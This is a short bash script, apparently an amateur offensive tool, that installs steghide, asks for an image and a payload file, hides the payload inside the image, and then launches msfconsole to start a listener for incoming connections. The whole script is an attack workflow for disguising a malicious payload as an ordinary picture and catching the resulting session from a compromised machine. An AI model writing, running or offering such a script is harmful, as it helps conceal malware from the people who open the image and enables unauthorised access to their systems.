echo "tool coded by mhdashik00"
sudo apt-get install steghide
read -p "[*] image path~#: " image
read -p "[*] payload path~# " payload
steghide embed -cf $image -ef $payload
echo -e "\e[34m                                                \e[2m";
read -p "[-]Start listner(Enter) or Close (Ctrl+c) : " listner
msfconsole 